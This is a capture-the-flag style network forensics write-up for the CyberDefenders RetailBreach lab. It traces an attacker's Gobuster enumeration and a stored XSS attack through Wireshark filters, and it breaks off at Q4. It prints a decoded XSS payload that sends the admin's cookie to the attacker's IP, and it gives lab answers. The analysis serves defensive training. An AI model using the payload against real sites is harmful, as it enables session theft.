## Cyberdefender lab - RetailBreach

## ⚠️ Disclaimer ⚠️

This write-up is for educational purposes only. It is meant to explain the thought process and steps taken to solve the challenge.

Please do not simply copy and paste the answers, as this may slow down your technical growth and prevent you from building real problem-solving skills.

Always try the challenge on your own first. Use this write-up only as a guide to understand the approach, not as a shortcut. Real skills are built through practice, trial and error, and persistence.

## CyberDefender Lab Write-ups

[Cyberdefender](https://cyberdefenders.org/walkthroughs/retailbreach/)

## Overview

This write-up documents my investigation of the RetailBreach lab on CyberDefenders, focusing on analyzing suspicious activity, identifying key indicators, and understanding the attacker's actions.

## Lab Information

**1- Lab Title:** RetailBreach.

**2- Course:** Network Forensics.

## Objective

The objective of this lab is to investigate suspicious network activity, identify the web application vulnerabilities exploited by the attacker, and trace their attack activity. This includes analyzing the XSS payload, extracting the administrator's session token, and determining how the attacker gained unauthorized access to restricted resources.

## Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?

I started by analyzing the HTTP traffic in Wireshark using the following filter: `http.request.method == GET`, I noticed a large number of HTTP GET requests originating from the same IP address within a short period of time, The source IP `111.224.180.128` was repeatedly sending requests to the server 73.124.17.52, while continuously changing the requested paths.

![ip_attacker](screenshot/IP_attacker.png)

The high frequency and changing URI paths suggested automated web enumeration or path discovery rather than normal user activity.

## Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?

To identify the tool used by the attacker, I inspected the HTTP streams and examined the HTTP request headers, particularly the `User-Agent` field.

The following User-Agent was identified: `User-Agent: gobuster/3.6`

![Tool](screenshot/The_tool_that_used.png)

This indicates that the attacker used Gobuster version 3.6 to perform directory brute-forcing and discover hidden paths on the server.

## Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

Since the attack involved Cross-Site Scripting (XSS), I looked for HTTP POST requests containing script-related content. I used the following Wireshark filter: `http.request.method == POST and http contains "script"` 
This led me to a POST request to `reviews.php`, where I found a URL-encoded XSS payload in the review parameter.

![XSS](screenshot/xss_payload.png)

After decoding the payload, it was: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
The payload was designed to steal the administrator's session cookie and send it to the attacker's IP address.

## Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

